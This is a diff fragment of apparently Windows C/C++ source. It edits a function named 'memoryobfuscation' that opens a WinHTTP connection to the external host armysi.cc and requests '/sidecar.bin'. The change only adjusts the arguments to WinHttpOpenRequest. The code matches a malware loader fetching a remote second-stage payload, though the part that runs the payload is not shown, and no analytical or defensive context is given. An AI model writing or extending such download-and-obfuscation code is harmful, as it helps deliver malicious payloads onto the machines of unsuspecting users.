@@ -168,7 +168,7 @@ void memoryobfuscation(){
     HINTERNET hConnect = WinHttpConnect(hSession, L"armysi.cc", 80, 0); // 443 for HTTPS
     if (!hConnect) return;
      
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/sidecar.bin", NULL, NULL, NULL); //,WINHTTP_FLAG_SECURE);
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/sidecar.bin", NULL, NULL, NULL, NULL); //,WINHTTP_FLAG_SECURE);
     if (!hRequest) return;
     
     if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) return;
